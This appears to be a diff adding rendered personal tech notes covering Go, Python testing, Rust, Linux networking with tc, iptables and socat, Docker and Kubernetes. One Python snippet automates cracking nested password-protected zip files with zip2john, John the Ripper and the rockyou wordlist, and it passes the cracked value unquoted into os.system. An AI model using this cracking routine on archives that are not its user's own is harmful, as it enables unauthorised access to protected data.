+
+if intSet[100] {
+  print(&quot;100 is in the Set&quot;)
+}
+</code></pre>
+<p>The second one is using empty struct as value: it uses 0 byte in memory but is a bit trickier.</p>
+<pre><code class="language-Go">intSet := map[int]struct{}{}
+
+if _, ok := intSet[100]; ok {
+  print(&quot;100 is in the Set&quot;)
+}
+</code></pre>
+<h2 id="benchmark-in-go"><a class="header" href="#benchmark-in-go">Benchmark in Go</a></h2>
+<p>Functions start with 'Benchmark'.</p>
+<pre><code class="language-bash"># default, runs using all CPUs available. Otherwise, -cpu=X
+go test -bench=.
+# -count X -&gt; runs X times each benchmark function
+# -benchmem -&gt; include memory allocation statistics
+</code></pre>
+<p>Output format</p>
+<pre><code class="language-bash">BenchmarkFunctionName-&lt;number-of-CPU&gt; &lt;number-of-execution&gt; &lt;speed-of-each-operation&gt;
+# number-of-execution = b.N
+</code></pre>
+<h2 id="the-internal-package-in-go"><a class="header" href="#the-internal-package-in-go">The internal package in Go</a></h2>
+<pre><code class="language-bash">.
+├── bar
+│   └── bar.go           # Cannot access
+├── foo
+│   ├── foo.go           # Can access
+│   ├── internal
+│   │   └── internal.go  # Exported identifiers are only accessible to the direct package of 'internal' and the siblings package of 'internal'
+│   └── sibling
+│       └── sibling.go   # Can access
+└── go.mod
+</code></pre>
+<h2 id="type-alias"><a class="header" href="#type-alias">Type Alias</a></h2>
+<p>In the following example, <code>Bar</code> is an alias of <code>Foo</code>. It has everything <code>Foo</code> has and it does not need type conversion.</p>
+<pre><code class="language-Go">type Foo struct{}
+
+func (f Foo) Hello() string {
+	return &quot;Hello&quot;
+}
+
+type Bar = Foo
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="python"><a class="header" href="#python">Python</a></h1>
+<h2 id="cli---shell"><a class="header" href="#cli---shell">CLI - Shell</a></h2>
+<ul>
+<li>prompt-toolkit: allows to get a shell in which the user can execute commands.
+<ul>
+<li>keeps a history of the commands</li>
+<li>proposal of completion from existing commands and from the history</li>
+<li>syntax highlighting</li>
+<li>dialog box (Ex: Important decision)</li>
+</ul>
+</li>
+<li>PyInquirer: create simple interactions with the user (questions/answers)</li>
+</ul>
+<h3 id="click"><a class="header" href="#click">Click</a></h3>
+<p>How to use a tag (eg:<code>@common_options</code>) for commands that have same options.</p>
+<pre><code class="language-python">def common_options(f: Callable):
+	options = [
+		click.option(...),
+	]
+	return functools.reduce(lambda x,opt: opt(x)options,f)
+</code></pre>
+<h2 id="data-visualization"><a class="header" href="#data-visualization">Data visualization</a></h2>
+<ul>
+<li>Pandas, Numpy</li>
+<li><a href="it/programming/python/../../tools/matplotlib/index.html">Matplotlib</a>, Graphviz, Dash, Orange</li>
+</ul>
+<p>Recursive unzip with password</p>
+<pre><code class="language-python">import os
+
+number = 556
+
+while number &gt; 0:
+	os.system(&quot;zip2john zip_&quot;+str(number)+&quot;.zip &gt; hash&quot;)
+	os.system(&quot;john --wordlist=rockyou.txt hash &gt; dustbin&quot;)
+	os.system(&quot;john --show hash &gt; needyou&quot;)
+	f = open('needyou','r')
+	lines = f.readlines()
+	password = lines[0].split(':')[1]
+	f.close()
+	os.system(&quot;unzip -P &quot;+password+&quot; zip_&quot;+str(number)+&quot;.zip&quot;)
+	os.system(&quot;rm zip_&quot;+str(number)+&quot;.zip&quot;)
+	number-=1
+</code></pre>
+<h2 id="testing-in-python"><a class="header" href="#testing-in-python">Testing in Python</a></h2>
+<h3 id="pytestfixture"><a class="header" href="#pytestfixture">@pytest.fixture</a></h3>
+<p>Run code before a test method</p>
+<pre><code class="language-python">@pytest.fixture
+def before_test():
+	pass
+
+def test_f1(before_test):
+	pass
+</code></pre>
+<h3 id="pytestmark"><a class="header" href="#pytestmark">@pytest.mark</a></h3>
+<p>Run test by markers: <code>pytest.mark.&lt;name&gt;</code></p>
+<pre><code class="language-bash">pytest -m &lt;marker&gt;
+</code></pre>
+<h3 id="pytestmarkparametrize"><a class="header" href="#pytestmarkparametrize">pytest.mark.parametrize</a></h3>
+<p>Run a test again multiple sets of argument</p>
+<pre><code class="language-python">@pytest.mark.parametrize(&quot;i,j,o&quot;,[(5,5,10),(3,5,12)])
+def test_add(i,j,o):
+	assert i+j == o,&quot;failed&quot;
+</code></pre>
+<h3 id="pytestraises"><a class="header" href="#pytestraises">@pytest.raises</a></h3>
+<p>We expect to have an error.
+@pytest.raises(ValueError)</p>
+<h3 id="command-line-options"><a class="header" href="#command-line-options">Command line options</a></h3>
+<pre><code class="language-bash">-s # display prints
+-pytest-randomly # run tests in a random order
+-pytest-cov # compute code coverage at the same time
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="rust"><a class="header" href="#rust">Rust</a></h1>
+<h2 id="things-to-know"><a class="header" href="#things-to-know">Things to know</a></h2>
+<ul>
+<li>no variadic functions (unknown number of parameters), except for macros <code>println!(...)</code>.</li>
+<li><code>dbg!()</code> allows to debug an expression and also returns the result
+<ul>
+<li>
+<pre><pre class="playground"><code class="language-rust">
+<span class="boring">#![allow(unused)]
+</span><span class="boring">fn main() {
+</span>let a = dbg!(5+1)+8;
+println!(&quot;{a}&quot;);
+<span class="boring">}
+</span></code></pre></pre>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="good-practice"><a class="header" href="#good-practice">Good practice</a></h2>
+<ul>
+<li><a href="https://rust-lang.github.io/api-guidelines/about.html">rust-api guidelines</a></li>
+</ul>
+<h2 id="build"><a class="header" href="#build">Build</a></h2>
+<p>By default, binaries are compiled in <code>unwind</code> mode which raises the call stack. Using <code>abort</code> allows to have smaller binaries but the <code>Drop</code> is not done (memory not cleared).</p>
+<pre><code class="language-toml">[profile.release]
+panic = 'abort'
+</code></pre>
+<p>Performing a <code>panic</code> in a <code>panic</code> is equivalent to an <code>abort</code>, it is a bad practice.</p>
+<h2 id="linters"><a class="header" href="#linters">Linters</a></h2>
+<ul>
+<li><a href="https://github.com/rust-lang/rust-clippy">Clippy</a>: A collection of lints to catch common mistakes and improve your Rust code.</li>
+<li><a href="https://github.com/rust-lang/miri">miri</a>: An interpreter for Rust's mid-level intermediate representation.</li>
+<li><a href="https://valgrind.org/">valgrind</a>: detect many memory management and threading bugs, and profile your programs in detail.</li>
+<li><a href="https://github.com/rust-secure-code/cargo-geiger">cargo-geiger</a>: Detects usage of unsafe Rust in a Rust crate and its dependencies.</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="deepfake-audio"><a class="header" href="#deepfake-audio">Deepfake audio</a></h1>
+<pre class="mermaid">flowchart LR
+	A{{Reference sound extract}}--&gt;B[Voice encoder]--Footprint of the voice --&gt;E
+	C{{Text extract}}--&gt;D
+	subgraph Synthesizer
+	D[Encoder]--&gt;E[Concat]--&gt;F[Attention]--&gt;G[Decoder]
+	G--&gt;F
+	end
+	G--Mel-Spectrogram --&gt;H[Vocoder]--&gt;I{{Audio Signal}}
+</pre>
+<ol>
+<li>Creation of a &quot;footprint&quot; of the person's voice using the encoder</li>
+<li>Adding this footprint to the synthesizer which translates any text into a mel-spectrogram. The synthesizer produces the general mechanisms of speech and with the addition of the footprint, we can say that the spectrogram also contains the nuances of the person's voice.</li>
+<li>The mel-spectrogram is interpreted by the vocoder which translates it into an audio signal that we can listen to.</li>
+</ol>
+<p>Source: <a href="https://arxiv.org/pdf/1806.04558.pdf">Transfer Learning from Speaker Verification to
+Multispeaker Text-To-Speech Synthesis</a></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="transfer-learning"><a class="header" href="#transfer-learning">Transfer learning</a></h1>
+<p>Transfer learning corresponds to a redirection of trained models for one use to another use.</p>
+<p>Neural networks are made of 2 blocks</p>
+<ul>
+<li>the one building the features</li>
+<li>the one using the features for classification/regression purposes</li>
+</ul>
+<p>Starting from such a neural network, one of the possibilities offered to the user to transfer the knowledge acquired during the training for a given problem to another problem consists in keeping the layers generating the features and re-training the layers doing the classification.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="linux"><a class="header" href="#linux">Linux</a></h1>
+<h2 id="namespace"><a class="header" href="#namespace">Namespace</a></h2>
+<p>This is the basis of docker. It allows you to simulate a network on your machine.</p>
+<pre><code class="language-bash">ip netns
+ip netns add &lt;NAME&gt;
+ip netns exec &lt;NAME&gt; &lt;COMMAND&gt; # execute a command in another namespace
+</code></pre>
+<h2 id="mountunmount"><a class="header" href="#mountunmount">Mount/Unmount</a></h2>
+<p><em>following commands must be run as root</em></p>
+<pre><code class="language-bash">fdisk -l # view the disk and the partition
+
+/dev/sd?  -&gt; physical disk
+/dev/sda? -&gt; partitions on the sda disk
+</code></pre>
+<h3 id="mounting-on-mntdata"><a class="header" href="#mounting-on-mntdata">Mounting on <code>/mnt/data</code></a></h3>
+<pre><code class="language-bash">mkdir -p /mnt/data # create an empty dir
+parted -l # determine the filesystem type
+mount -t &lt;ext4&gt; /dev/sd /mnt/data
+</code></pre>
+<h3 id="unmounting"><a class="header" href="#unmounting">Unmounting</a></h3>
+<p>The argument is either the mount point  or the name of the disk</p>
+<pre><code class="language-bash">umount /dev/sdb
+umount /mnt/data
+</code></pre>
+<h2 id="shell-redirection"><a class="header" href="#shell-redirection">Shell redirection</a></h2>
+<pre><code class="language-bash">/dev/null # empty, import anything, it will disappear
+/dev/zero # endless zeros
+/dev/urandom # endless random numbers
+/dev/full # file that always returns the error code ENOSPC (No space left on device)
+
+# following ones are links to the kernel file descriptor
+/dev/stdin # standard input stream 			# 0
+/dev/stdout # standard output stream		# 1
+/dev/stderr # standard error output stream  # 2
+</code></pre>
+<h3 id="redirects"><a class="header" href="#redirects">Redirects</a></h3>
+<p>By default, it redirects stdout.</p>
+<ul>
+<li><code>&gt;</code> is an overwrite method</li>
+<li><code>&gt;&gt;</code> is an append method</li>
+</ul>
+<p>Following lines are equivalent</p>
+<pre><code class="language-bash">echo &quot;Hello, World!&quot; &gt; file.txt
+echo &quot;Hello, World!&quot; 1&gt; file.txt
+</code></pre>
+<ul>
+<li><code>&gt;&amp;</code> is the syntax for redirecting the stream to a file descriptor.</li>
+</ul>
+<pre><code class="language-bash"># redirecting stderr to stdout
+ls file-that-does-not-exist 2&gt;&amp;1 # if no '&amp;' the file named &quot;1&quot; will be created
+</code></pre>
+<p>Redirect <code>stdout</code> and <code>stderr</code> to the same place</p>
+<pre><code class="language-bash">ls -la /tmp /dir-that-does-not-exist 1&gt;file.txt 2&gt;&amp;1
+cat file.txt
+</code></pre>
+<h2 id="command-line-tips"><a class="header" href="#command-line-tips">Command line tips</a></h2>
+<h3 id="self-signed-certificate"><a class="header" href="#self-signed-certificate">Self-signed certificate</a></h3>
+<pre><code class="language-bash">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -sha256 -days 3650 -nodes
+</code></pre>
+<h3 id="awk"><a class="header" href="#awk">awk</a></h3>
+<h4 id="from-timestamp-to-human-readable-date"><a class="header" href="#from-timestamp-to-human-readable-date">From timestamp to human readable date</a></h4>
+<pre><code class="language-bash">TZ=Ameria/Los_Angeles awk '/path to look for/' { print strftime (&quot;%T&quot;, $1), $3, $7} file.log
+</code></pre>
+<h3 id="creating-large-files-from-your-terminal"><a class="header" href="#creating-large-files-from-your-terminal">Creating large files from your terminal</a></h3>
+<p>The <code>dd</code> command will create a sparse file.</p>
+<pre><code class="language-bash">dd if=/dev/urandom of=your-filename bs=2G count=1
+# bs = block size (1M = 1024Mb)
+# count = number of blocks
+</code></pre>
+<p>The <code>fallocate</code> command will not create a sparse file, which means it is much faster.</p>
+<pre><code class="language-bash">fallocate -l 1G your-filename
+</code></pre>
+<h3 id="traffic-control---tc"><a class="header" href="#traffic-control---tc">Traffic control - TC</a></h3>
+<p><em>tc must be run as root</em></p>
+<p><strong>qdiscs</strong> (queuing discipline - modify the scheduler) buffer between the protocol stack and the network interface. By default, it uses a FIFO approach.</p>
+<p><strong>filter</strong> determines which classful qdisc a packet should be enqueued to. (Can qualify the packet based on things like: source/destination/IP...)</p>
+<p><strong>classes</strong> a class is a sub-qdisc. A class may contains another class. Using classes, we can configure the QoS in more detail.</p>
+<pre><code class="language-bash"># delay to the egress (outgoing packets) scheduler
+tc qdisc add dev eth0 root netem delay 200ms
+# delay = the network property to modify
+# netem = network emulator (emulate a WAN property)
+</code></pre>
+<p><strong>Example</strong></p>
+<pre><code class="language-bash">$ ping -c 4 google.com
+PING google.com ..... 56(84) bytes of data.
+64 bytes from ..... : icmp_seq=1 ttl=116 time=9.86 ms
+64 bytes from ..... : icmp_seq=2 ttl=116 time=12.2 ms
+64 bytes from ..... : icmp_seq=3 ttl=116 time=11.3 ms
+64 bytes from ..... : icmp_seq=4 ttl=116 time=10.5 ms
+
+--- google.com ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 8ms
+rtt min/avg/max/mdev = 9.859/10.971/12.185/0.870 ms
+$ tc qdisc add dev eth0 root netem delay 200ms # add some delay
+$ ping -c 4 google.com
+PING google.com ..... 56(84) bytes of data.
+64 bytes from ..... : icmp_seq=1 ttl=116 time=210 ms
+64 bytes from ..... : icmp_seq=2 ttl=116 time=210 ms
+64 bytes from ..... : icmp_seq=3 ttl=116 time=211 ms
+64 bytes from ..... : icmp_seq=4 ttl=116 time=210 ms
+
+--- google.com ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 7ms
+rtt min/avg/max/mdev = 209.870/210.072/210.585/0.546 ms
+</code></pre>
+<pre><code class="language-bash">tc qdisc del dev eth0 root # delete all rules
+# instead of del or add, possible values are: show (see what are default rules), change
+tc disc change dev eth0 root netem delay 200ms 10ms # +/- 10ms uniform distribution
+# instead of delay, possible values are: 'loss 10%' (packet loss of 10%), corrupt, duplicate.
+</code></pre>
+<p><strong>Bandwidth limit</strong></p>
+<pre><code class="language-bash">tc qdisc add dev eth0 root tbf rate 1mbit burst 32kbit latency 400ms
+# tbf: token buffer to manipulate traffic rates
+# rate: sustained max rate
+# burst: max allowed burst
+# latency: packets with higher latency get dropped
+
+
+$ iperf -c speedtest.serverius.net -p 5002
+------------------------------------------------------------
+Client connecting to speedtest.serverius.net, TCP port 5002
+TCP window size: 85.0 KByte (default)
+------------------------------------------------------------
+[  3] local 192.168.1.15 port 60442 connected with 178.21.16.76 port 5002
+write failed: Broken pipe
+[ ID] Interval       Transfer     Bandwidth
+[  3]  0.0- 0.1 sec  84.8 KBytes  12.6 Mbits/sec
+$ sudo tc qdisc add dev eth0 root tbf rate 1mbit burst 32kbit latency 400ms
+$ iperf -c speedtest.serverius.net p 5002
+------------------------------------------------------------
+Client connecting to speedtest.serverius.net, TCP port 5002
+TCP window size: 85.0 KByte (default)
+------------------------------------------------------------
+[  3] local 192.168.1.15 port 43834 connected with 178.21.16.76 port 5002
+[ ID] Interval       Transfer     Bandwidth
+[  3]  0.0-10.3 sec  1.38 MBytes  1.12 Mbits/sec
+</code></pre>
+<h3 id="exiftool"><a class="header" href="#exiftool">Exiftool</a></h3>
+<h4 id="rename-images-to-their-creationmodification-date-attributes"><a class="header" href="#rename-images-to-their-creationmodification-date-attributes">Rename images to their creation/modification date attributes</a></h4>
+<pre><code class="language-bash">exiftool -ext jpg '-FileName&lt;CreateDate' -d %Y%m%d_%H%M%S%%-c.%%e current_filename.jpg
+# -d: specify a date format Y=year m=month d=day H=hours M=minutes S=seconds
+# %-c: add a counter if multiple images have the same name.
+# %%e: keep the extension
+
+exiftool -ext jpg '-FileName&lt;filemodifydate' -d %Y%m%d_%H%M%S%%-c.%%e ./some-directory
+# it will execute the command on all images inside the directory
+</code></pre>
+<h3 id="iperf"><a class="header" href="#iperf">iperf</a></h3>
+<p>Tool used to measure the maximum achievable bandwidth on IP networks. More on this: <a href="https://iperf.fr/">iperf3</a>.</p>
+<pre><code class="language-bash"># server side
+iperf --server
+# client side
+iperf --client HOST_IP
+</code></pre>
+<h3 id="iptables"><a class="header" href="#iptables">iptables</a></h3>
+<p>Here are some useful commands for the <code>iptables</code> firewall:</p>
+<h4 id="list-rules"><a class="header" href="#list-rules">List rules</a></h4>
+<pre><code class="language-bash">iptables -L -v
+# -v: verbose mode
+</code></pre>
+<h4 id="reset-rules"><a class="header" href="#reset-rules">Reset rules</a></h4>
+<pre><code class="language-bash"># Start with empty tables
+iptables --flush [chain] # delete all rules in chain or all chains
+iptables --delete-chain [chain] # delete a user-defined chain or all chains
+</code></pre>
+<h4 id="ip-black-listing"><a class="header" href="#ip-black-listing">IP black listing</a></h4>
+<pre><code class="language-bash">iptables -A INPUT -s IP -j DROP
+# -A: append a rule to the INPUT chain (incoming traffic)
+
+# you can log all incoming traffic from specific IP
+iptables -A INPUT -s IP -j LOG --log-prefix &quot;Blocked IP: &quot;
+
+# deleting a rule blocking traffic from an IP address
+iptables -D INPUT -s IP -j DROP
+# -D: delete
+</code></pre>
+<h4 id="accept-connection-to-a-specific-port"><a class="header" href="#accept-connection-to-a-specific-port">Accept connection to a specific port</a></h4>
+<pre><code class="language-bash"># Accept connection on port 22 using the TCP protocol
+iptables -A INPUT -p tcp --dport 22 -j ACCEPT
+
+# if you don't need that port anymore
+iptables -D INPUT -p tcp --dport 22 -j ACCEPT
+</code></pre>
+<h4 id="save-current-rules"><a class="header" href="#save-current-rules">Save current rules</a></h4>
+<pre><code class="language-bash">iptables-save &gt; file.txt
+</code></pre>
+<h4 id="restore-rules"><a class="header" href="#restore-rules">Restore rules</a></h4>
+<pre><code class="language-bash">iptables-restore &lt; file.txt
+</code></pre>
+<h4 id="drop-vs-reject"><a class="header" href="#drop-vs-reject">DROP vs REJECT</a></h4>
+<ul>
+<li>use <code>REJECT</code> when you want the other end to know the port is closed (e.g. a <code>ping</code> would get a <code>Destination Port Unreachable</code> error. This indicates the destination was reached but no <code>echo reply</code> was sent back).</li>
+<li>use <code>DROP</code> for connections to hosts you don't want people to see (e.g. a <code>ping</code> would not get any response at all. The request will time out).</li>
+</ul>
+<h3 id="socat---tcptls-proxy"><a class="header" href="#socat---tcptls-proxy">SOCAT - TCP/TLS Proxy</a></h3>
+<p>The following commands will redirect traffic incoming on port <code>7000</code> to a remote host (<code>127.0.0.1:4444</code>).</p>
+<h4 id="tcp-proxy"><a class="header" href="#tcp-proxy">TCP Proxy</a></h4>
+<pre><code class="language-bash">socat -d TCP-LISTEN:7000,fork,reuseaddr TCP4:127.0.0.1:4444
+</code></pre>
+<h4 id="tls-proxy"><a class="header" href="#tls-proxy">TLS Proxy</a></h4>
+<pre><code class="language-bash">socat openssl-listen:7000,fork,reuseaddr,verify=0,key=./key.pem,cert=./cert.pem openssl-connect:127.0.0.1:4444,verify=0
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="file-system"><a class="header" href="#file-system">File system</a></h1>
+<p>A file system is a set of rules that manage the way files are stored and retrieved on a disk. It defines how data is written to disk.</p>
+<h2 id="cluster---allocation-unit"><a class="header" href="#cluster---allocation-unit">Cluster - Allocation unit</a></h2>
+<p>This is the smallest allocation unit imposed by the file system. It is made up of multiple sectors (the smallest physical part: ~512 bytes).
+The cluster is the smallest space a file can occupy on a disk.</p>
+<p>For example: if the cluster size is 4 Kb, to store a 10 Kb file, 3 clusters are needed (for a total of 12 Kb). The remaining 2 Kb is lost. The space lost is included in the file size.</p>
+<h2 id="external-disk"><a class="header" href="#external-disk">External disk</a></h2>
+<ul>
+<li>
+<p>FAT32</p>
+<ul>
+<li>Compatible with all major operating systems</li>
+<li>Maximum file size is 4 GB</li>
+<li>Minimum allocation size is 512 bytes</li>
+</ul>
+</li>
+<li>
+<p>ExFAT (enhanced FAT32)</p>
+<ul>
+<li>No file size limit</li>
+<li>Minimum file size for allocation is 4 Kb</li>
+</ul>
+</li>
+<li>
+<p>NTFS</p>
+<ul>
+<li>Proprietary file system developed by Windows</li>
+<li>Free drivers available for Linux</li>
+<li>No file size limit</li>
+<li>Minimum allocation size is 512 bytes (for small volumes)</li>
+</ul>
+</li>
+</ul>
+<p><a href="https://support.microsoft.com/en-us/topic/default-cluster-size-for-ntfs-fat-and-exfat-9772e6f1-e31a-00d7-e18f-73169155af95">Default cluster size for NTFS, FAT, and exFAT</a></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="tools-8"><a class="header" href="#tools-8">Tools</a></h1>
+<p>Some cool tools I use/to use</p>
+<h2 id="diagram-as-code"><a class="header" href="#diagram-as-code">Diagram as code</a></h2>
+<ul>
+<li>Graphviz, dot</li>
+<li>plantUML</li>
+<li>MermaidJs</li>
+</ul>
+<h2 id="leaflet-js"><a class="header" href="#leaflet-js">Leaflet JS</a></h2>
+<p>Mobile friendly interactive Maps based on OpenStreetMap. Desktop+Mobile</p>
+<h2 id="create-video-of-a-terminal-session"><a class="header" href="#create-video-of-a-terminal-session">Create video of a terminal session</a></h2>
+<p>(This is just text so you can do CTRL+C &amp; CTRL+V on the video) https://asciinema.org/
+To embed the video in Markdown https://github.com/marionebl/svg-term-cli</p>
+<h2 id="gotty"><a class="header" href="#gotty"><a href="https://github.com/yudai/gotty">GoTTY</a></a></h2>
+<p>WebShell TTY</p>
+<h3 id="related"><a class="header" href="#related">Related</a></h3>
+<ul>
+<li><a href="https://github.com/huashengdun/webssh">WebSSH</a>: <a href="https://www.digitalocean.com/community/tutorials/how-to-connect-to-a-terminal-from-your-browser-using-python-webssh">digitalocean tutorial</a></li>
+</ul>
+<h2 id="nipio"><a class="header" href="#nipio"><a href="https://nip.io/">nip.io</a></a></h2>
+<p>Dead simple wildcard DNS for any IP Address.
+Stop editing your <code>/etc/hosts</code> file with custom hostname and IP address mappings.
+nip.io allows you to do that by mapping any IP Address to a hostname using the following formats:</p>
+<ul>
+<li>Without a name:
+<ul>
+<li>10.0.0.1.nip.io maps to 10.0.0.1</li>
+</ul>
+</li>
+<li>With a name:
+<ul>
+<li>app.10.8.0.1.nip.io maps to 10.8.0.1</li>
+</ul>
+</li>
+</ul>
+<h2 id="asciinema"><a class="header" href="#asciinema"><a href="https://asciinema.org/">Asciinema</a></a></h2>
+<p>Create video of a terminal, simple recording, copy &amp; paste, embedding. This is just text so you can do <code>CTRL+C</code> &amp; <code>CTRL+V</code> on the video.</p>
+<h3 id="recording-a-tmux-session"><a class="header" href="#recording-a-tmux-session">Recording a tmux session</a></h3>
+<pre><code class="language-bash">tmux new -s terminal-capture # start a new session
+&lt;C-b&gt; + d # detach from the session
+asciinema rec -c &quot;tmux attach -t terminal-capture&quot; # record the tmux session
+# do your stuff
+&lt;C-b&gt; + d # detach from the session to stop recording
+</code></pre>
+<h3 id="related-1"><a class="header" href="#related-1">Related</a></h3>
+<ul>
+<li><a href="https://github.com/marionebl/svg-term-cli">svg-term-cli</a>: Render asciicast to animated SVG</li>
+<li><a href="https://github.com/charmbracelet/vhs">VHS</a>: Your CLI home video recorder vhs</li>
+<li><a href="https://github.com/phw/peek">peek</a>: Simple animated GIF screen recorder with an easy to use interface.</li>
+</ul>
+<h2 id="flameshot"><a class="header" href="#flameshot"><a href="https://github.com/flameshot-org/flameshot">Flameshot</a></a></h2>
+<p>Powerful yet simple to use screenshot software.</p>
+<h2 id="borgbackup"><a class="header" href="#borgbackup"><a href="https://doc.ubuntu-fr.org/borgbackup">borgbackup</a></a></h2>
+<p>Extremely simple but powerful backup tool (with deduplication support)</p>
+<h2 id="damn-vulnerable-web-app"><a class="header" href="#damn-vulnerable-web-app"><a href="https://github.com/digininja/DVWA">Damn Vulnerable Web App</a></a></h2>
+<p>The aim of DVWA is to practice some of the most common web vulnerabilities, with various levels of difficulty, with a simple straightforward interface.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="docker"><a class="header" href="#docker">Docker</a></h1>
+<ul>
+<li><a href="it/tools/docker/index.html#docker-volumes">Docker volumes</a></li>
+<li><a href="it/tools/docker/index.html#manage-image-size">Manage image size</a></li>
+<li><a href="it/tools/docker/index.html#capturing-network-traffic-in-a-container">Capturing network traffic in a container</a></li>
+<li><a href="it/tools/docker/index.html#docker-forensic">Docker Forensic</a></li>
+<li><a href="it/tools/docker/index.html#docker-compose">Docker-compose</a></li>
+<li><a href="it/tools/docker/index.html#to-get-further">To get further</a></li>
+</ul>
+<pre><code class="language-bash">docker images # list images
+docker pull &lt;img:tag&gt; # pull a certain image
+docker run -it &lt;img:tag&gt; &lt;command&gt; # run a command in a new container (interactively)
+
+docker ps -as # list all containers
+docker exec -it &lt;container-id&gt; &lt;command&gt; # run a command in a running container
+docker container prune # delete all containers
+docker inspect &lt;container-id&gt; # show low-level info on a container
+docker commit &lt;container-id&gt; &lt;repository:tag&gt; # create a new image from container changes
+
+# Networks managing: None, Host, Bridge (default)
+docker network create --driver &lt;driver&gt; --subnet x.x.x.x/x --gateway x.x.x.x &lt;network-name&gt; # create a new network
+docker network connect &lt;network-name&gt; &lt;container-id&gt; [--ip x.x.x.x] # connect a container to a network (and changing the default ip)
+docker rmi $(docker images|grep none|awk '{ print $3 }') # remove docker images with tag or name at none
+</code></pre>
+<h2 id="docker-volumes"><a class="header" href="#docker-volumes">Docker volumes</a></h2>
+<pre class="mermaid">flowchart TB
+	A[Container]--bind out --&gt;B
+	subgraph B[Filesystem]
+	D[ContainerData]
+	end
+	A--volume --&gt;D
+	A--tmpfs mount --&gt;C[Memory]
+</pre>
+<pre><code class="language-bash">docker volume create &lt;volume-name&gt; # create a volume
+docker inspect &lt;volume-name&gt; # to get the mount point on the host
+</code></pre>
+<pre><code class="language-bash">docker run -itd --mount src=&lt;volume-name&gt;,target=/some/path --name &lt;container-name-to-create&gt; --rm &lt;image-name&gt; # mount a volume on the container
+</code></pre>
+<h2 id="manage-image-size"><a class="header" href="#manage-image-size">Manage image size</a></h2>
+<pre><code class="language-bash">docker image history &lt;image-name&gt; -notrunc # know the size and layers of an image
+</code></pre>
+<p><a href="it/tools/docker/./Dockerfile/index.html">Multi-stage Build</a>: allows to reduce the final size of a docker image by performing some operations before creating the final image (e.g. compiling the source code)</p>
+<p>Choose your base image:</p>
+<ul>
+<li>alpine</li>
+<li>debian</li>
+<li>scratch</li>
+<li>busybox:glibc (useful if the program is dynamic)</li>
+</ul>
+<p><code>C_GO_ENABLED=0</code>: Go doesn't use system libraries anymore but its own implementations so it becomes static (<code>net</code> and <code>dns</code> for example)</p>
+<p>Alpine uses musl but there is the possibility to install build-base</p>
+<p>The others use glibc. The 2 are not compatible (i.e. compiling on glibc and running on alpine will not work)</p>
+<h2 id="capturing-network-traffic-in-a-container"><a class="header" href="#capturing-network-traffic-in-a-container">Capturing network traffic in a container</a></h2>
+<p>To capture network packets in a container with Wireshark on your host, do the following:</p>
+<pre><code class="language-bash"># Get PID of the container
+docker inspect --format &quot;{{ State.Pid }}&quot; &lt;container-id&gt;
+# Enter the same network name space
+ns enter -n -t &quot;&lt;PID&gt;&quot;
+# run wireshark
+</code></pre>
+<h2 id="docker-forensic"><a class="header" href="#docker-forensic">Docker Forensic</a></h2>
+<ul>
+<li>
+<p>Dive: exploring image, layer, contents</p>
+</li>
+<li>
+<p>LiME: Linux Memory Extractor</p>
+</li>
+</ul>
+<h1 id="docker-compose"><a class="header" href="#docker-compose">Docker-compose</a></h1>
+<pre><code class="language-bash">docker-compose up --build -d # run, build and keep detach
+docker-compose stop/down
+</code></pre>
+<h1 id="to-get-further"><a class="header" href="#to-get-further">To get further</a></h1>
+<ul>
+<li><a href="it/tools/docker/../kubernetes/index.html">Kubernetes</a></li>
+<li>Skaffold</li>
+<li>Kustomize</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="dockerfile"><a class="header" href="#dockerfile">Dockerfile</a></h1>
+<h2 id="multi-stage-build"><a class="header" href="#multi-stage-build">Multi-stage build</a></h2>
+<p>Get a minimalist container simply running a binary. This helps keep the running docker container small while still be able to compile a project needing a lot of dependencies.</p>
+<pre><code class="language-dockerfile"># Step 1
+FROM golang:alpine3.7 as build-env # Create an alias
+COPY main.go /hello/main.go
+WORKDIR /hello
+RUN env GOOS=linux GOARCH=amd64 go build
+
+# Step 2
+FROM scratch
+COPY --from=build-env /hello/hello /bin/hello # copy the compiled file from the build-env image
+ENTRYPOINT [&quot;/bin/hello&quot;]
+</code></pre>
+<pre><code class="language-bash">docker build -t hello-scratch:v1 . # build your image with the Dockerfile in the current directory
+docker images # check you have your newly created image
+docker run hello-scratch:v1 # run your image
+</code></pre>
+<p><a href="https://docs.docker.com/build/building/multi-stage/">Official documentation for the multi-stage</a></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="kubernetes"><a class="header" href="#kubernetes">Kubernetes</a></h1>
+<p>Container orchestrator</p>
+<ul>
+<li>Single API to manage everything</li>
+<li>declarative management model</li>
+<li>no more port conflicts</li>
+<li>stateless and stateful application management with data persistence</li>
+<li>effortless management of rollouts and rollbacks</li>
+</ul>
+<p>A Kubernetes cluster contains 2 roles:</p>
+<ul>
+<li><code>master</code>: where the Control Manager (CM), scheduler, API Server → cluster management runs</li>
+<li><code>workers</code>: where our containers run, composed of a <code>kubelet</code>, <code>kubeproxy</code>,<code>docker runtime</code></li>
+</ul>
+<h2 id="try-it-locally"><a class="header" href="#try-it-locally">Try it locally</a></h2>
+<p>minikube.sigs.k8s.io/docs</p>
+<h2 id="etcd"><a class="header" href="#etcd">ETCD</a></h2>
+<p>Database to store cluster status</p>
+<h2 id="control-manager"><a class="header" href="#control-manager">Control Manager</a></h2>
+<p>Compares the state of the cluster with what is stored in ETCD (application version change, scaling...)</p>
+<h2 id="scheduler"><a class="header" href="#scheduler">Scheduler</a></h2>
+<p>choose the most appropriate cluster node to run the container (available RAM, CPU, disk space...) → Make the application more resilient</p>
+<h2 id="kubelet"><a class="header" href="#kubelet">Kubelet</a></h2>
+<p>launches containers (pods), monitors their status...</p>
+<!-- ## Kubeproxy -->
+<h2 id="runtime"><a class="header" href="#runtime">Runtime</a></h2>
